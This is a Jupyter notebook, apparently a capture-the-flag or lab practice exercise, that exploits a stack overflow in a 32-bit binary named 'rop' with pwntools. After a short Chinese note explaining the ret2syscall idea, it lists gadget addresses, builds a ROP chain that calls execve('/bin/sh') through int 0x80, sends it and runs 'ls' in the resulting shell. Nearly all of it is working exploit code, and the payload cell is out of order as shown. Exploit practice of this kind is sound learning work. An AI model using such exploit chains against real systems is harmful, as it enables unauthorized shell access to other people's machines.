{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stderr",
     "text": [
      "[*] Checking for new versions of pwntools\n",
      "    To disable this functionality, set the contents of /home/bohan/.cache/.pwntools-cache-3.6/update to 'never' (old way).\n",
      "    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n",
      "        [update]\n",
      "        interval=never\n",
      "[*] You have the latest version of Pwntools (4.6.0)\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../../')\n",
    "\n",
    "from pwn import *\n",
    "from util import *\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[*] '/home/bohan/res/ubuntu_share/pwn_test/stack_overflow/ret2syscall/rop'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n"
     ]
    }
   ],
   "source": [
    "rop = elf.load('./rop')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-2-0a238d91e46d>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mw_pipe\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "os.read(w_pipe, 1)"
   ]
  },
  {
   "source": [
    "栈上不能执行代码, 但在文件中发现'/bin/sh'和`int 0x80`, 于是构造rop链\n",
    "\n",
    "<img alt=\"pop_eax\" src=\"./pic/pop_eax.png\" width=\"40%\" height=\"40%\"> <br>\n",
    "\n",
    "<img alt=\"pop_ebcdx\" src=\"./pic/pop_ebcdx.png\" width=\"45%\" height=\"45%\"> <br>\n",
    "\n",
    "<img alt=\"int0x80\" src=\"./pic/int0x80.png\" width=\"40%\" height=\"40%\"> <br>\n",
    "\n",
    "<img alt=\"binsh\" src=\"./pic/binsh.jpg\" width=\"40%\" height=\"40%\"> <br>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "pop_edx_ecx_ebx = 0x0806eb90\n",
    "bin_sh = 0x080BE408\n",
    "int0x80 = 0x08049421\n",
    "\n",
    "pop_eax = 0x080bb196"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "    b'a' * (0xe8c - 0xe1c) + \\\n",
    "payload = \\\n",
    "    p32(pop_eax) + \\\n",
    "    p32(0xb) + \\\n",
    "    p32(pop_edx_ecx_ebx) + \\\n",
    "    p32(0) + \\\n",
    "    p32(0) + \\\n",
    "    p32(bin_sh) + \\\n",
    "    p32(int0x80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "write_pipe(payload + b'\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line2('ls')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3",
   "language": "python"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9-final"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}